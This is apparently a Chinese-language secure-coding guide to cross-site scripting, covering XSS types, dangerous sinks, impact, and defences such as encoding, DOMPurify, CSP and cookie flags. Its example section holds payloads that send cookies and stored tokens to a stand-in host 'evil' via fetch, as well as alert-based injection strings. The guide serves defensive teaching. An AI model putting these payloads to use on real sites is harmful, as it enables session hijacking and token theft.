# 跨站脚本 XSS (Cross-Site Scripting)

> 分类：客户端注入 | 风险：高 | CWE-79 | OWASP A03:2021

## 1. 攻击原理

应用把不可信数据输出到 HTML 页面时未做上下文编码，浏览器将其当作脚本执行。脚本在同源上下文中运行，可读取 DOM、窃取 Cookie、发起任意请求、篡改页面、记录键盘。

| 类型 | 数据流向 | 特点 |
|---|---|---|
| 存储型 | 数据库 → 页面 | 影响所有访问者，最危险 |
| 反射型 | URL 参数 → 页面 | 需诱导点击，常配合钓鱼 |
| DOM 型 | 客户端 JS 读取可控源 → 写入 sink | 不经过服务端，WAF 难发现 |

常见 sink：`innerHTML`、`outerHTML`、`document.write`、`eval`、`setTimeout(string)`、`location`、`jQuery.html()`、Vue `v-html`、React `dangerouslySetInnerHTML`。

常见 source：`location.hash/search`、`document.referrer`、`postMessage`、`localStorage`、`innerText` 之外的一切。

## 2. 攻击示例

```html
<!-- 反射型 -->
https://site.com/search?q=<script>fetch('//evil/?c='+document.cookie)</script>

<!-- 图片 onerror 绕过简单过滤 -->
<img src=x onerror="fetch('//evil/?c='+localStorage.token)">

<!-- DOM 型 -->
<div id="out"></div>
<script>document.getElementById('out').innerHTML = location.hash.slice(1);</script>
<!-- 访问 #<img src=x onerror=alert(1)> -->
```

存储型：评论内容 `<svg/onload=alert(document.domain)>` 被原样渲染。

## 3. 影响

- 会话劫持（Cookie 未设 HttpOnly 时）
- 窃取 Token / 敏感数据、篡改转账收款账号
- 蠕虫式传播（如早期微博 XSS）
- 配合 CSRF 绕过同源策略限制发起请求

## 4. 防御措施

1. **输出编码（根本手段）**：按输出上下文编码
   - HTML 正文 → HTML 实体编码 `& < > " '`
   - HTML 属性 → 引号包裹 + 实体编码
   - `<script>` 内 → JS 字符串转义（避免直接把数据写入脚本）
   - URL 参数 → `encodeURIComponent`
   - CSS → 避免用户可控
2. **富文本白名单净化**：使用 DOMPurify，禁止自研正则黑名单。
3. **CSP 第二道防线**：`script-src 'self' 'nonce-<随机>'`，禁用 `unsafe-inline`、`unsafe-eval`；`object-src 'none'`；`base-uri 'self'`。
4. **Cookie 加固**：`HttpOnly`（脚本不可读）+ `Secure` + `SameSite`。
5. **安全 DOM API**：用 `textContent`、`setAttribute`、`createElement` 替代 `innerHTML`。
6. **框架默认转义不要关**：React 默认转义，`dangerouslySetInnerHTML` 需评审；Vue 的 `v-html`、Angular 的 `bypassSecurityTrust*` 同样。
7. **可信类型（Trusted Types）**：`require-trusted-types-for 'script'`，从浏览器层面禁止字符串进 sink。

## 5. 代码对比

```js
// ❌
el.innerHTML = userInput;
document.write(userInput);
eval(userInput);

// ✅
el.textContent = userInput;
el.setAttribute('title', userInput);
```

```js
// ✅ 富文本
import DOMPurify from 'dompurify';
el.innerHTML = DOMPurify.sanitize(dirty, { ALLOWED_TAGS: ['b','i','p','a','ul','li'] });
```

```html
<!-- ✅ CSP（配合 nonce） -->
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self' 'nonce-abc123'; object-src 'none'; base-uri 'self'">
```

```js
// ✅ Cookie
res.cookie('sid', id, { httpOnly: true, secure: true, sameSite: 'lax', path: '/' });
```

## 6. 自查清单

- [ ] 全站模板引擎自动转义开启，无 `|safe`、`v-html`、`dangerouslySetInnerHTML` 滥用
- [ ] 富文本输入输出均经过 DOMPurify 类库净化
- [ ] 无 `innerHTML` / `document.write` 接收用户可控数据
- [ ] CSP 已启用且不含 `unsafe-inline` / `unsafe-eval`
- [ ] Cookie 具备 HttpOnly + Secure + SameSite
- [ ] `postMessage` 消息做了 origin 校验并安全渲染
- [ ] 上传的 SVG / HTML 文件做了净化或禁止直接访问

## 7. 参考资料

- OWASP: XSS Prevention Cheat Sheet
- OWASP: DOM based XSS Prevention Cheat Sheet
- CWE-79
- PortSwigger: Cross-site scripting
